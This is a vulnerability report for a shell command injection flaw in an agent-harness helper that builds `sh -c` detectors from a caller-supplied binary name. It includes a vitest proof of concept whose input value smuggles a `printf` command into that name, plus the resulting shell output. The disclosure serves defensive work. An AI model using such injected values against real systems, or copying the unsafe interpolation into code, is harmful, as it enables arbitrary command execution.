# Agent harness tools binary-exists shell fallback executes `binaryName`

## Summary

The public `createBinaryExistsDetectors(binaryName)` helper constructs its fallback detector by interpolating `binaryName` into a `sh -c` program. A caller-provided binary name containing a double quote and shell operators therefore executes arbitrary shell commands when that returned detector is run.

## Reproduction

Create a disposable probe at `packages/agent-harness-tools/src/__probe__.test.ts`:

```ts
import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";
import { createBinaryExistsDetectors } from "./binary-exists.js";

describe("createBinaryExistsDetectors shell fallback", () => {
  it("executes shell text supplied through binaryName", () => {
    const injected = 'missing"; printf pwned > /tmp/poe-code-binary-detector-pwned; #';
    const shellDetector = createBinaryExistsDetectors(injected)[2];

    execFileSync(shellDetector.command, shellDetector.args, { shell: false });

    const observed = execFileSync("cat", ["/tmp/poe-code-binary-detector-pwned"], {
      encoding: "utf8"
    });
    expect(observed).toBe("pwned");
    console.log(JSON.stringify({ command: shellDetector.command, args: shellDetector.args, observed }));
    execFileSync("rm", ["-f", "/tmp/poe-code-binary-detector-pwned"]);
  });
});
```

Run it and clean up the disposable probe:

```sh
npm exec -- vitest run packages/agent-harness-tools/src/__probe__.test.ts --reporter verbose
rm packages/agent-harness-tools/src/__probe__.test.ts
rm -f /tmp/poe-code-binary-detector-pwned
```

## Observed Behavior

The test passes and logs a fallback detector whose shell program includes the injected `printf` commands:

```text
{"command":"sh","args":["-c","test -f \"/usr/local/bin/missing\"; printf pwned > /tmp/poe-code-binary-detector-pwned; #\" || test -f \"/usr/bin/missing\"; printf pwned > /tmp/poe-code-binary-detector-pwned; #\" || test -f \"$HOME/.local/bin/missing\"; printf pwned > /tmp/poe-code-binary-detector-pwned; #\" || test -f \"$HOME/.claude/local/bin/missing\"; printf pwned > /tmp/poe-code-binary-detector-pwned; #\""],"observed":"pwned"}
```

`createBinaryExistsDetectors()` is exported from `packages/agent-harness-tools/src/index.ts`, and the interpolation occurs in `packages/agent-harness-tools/src/binary-exists.ts` when it builds `args: ["-c", ...]` for the shell fallback.

## Expected Behavior

Supplying a binary identifier to an exported existence-detector helper must never cause any portion of that identifier to be interpreted as shell syntax. The detector should check the requested executable path without executing caller-controlled commands.

## Impact

Any consumer that invokes the exported fallback detector with an untrusted or mutable binary name can execute arbitrary commands in the detector environment. Within the package, the E2B auto-configuration path runs these detectors for agent definition `binaryName` values, so this also compounds any route that lets an attacker alter or supply agent metadata before a sandbox command run.
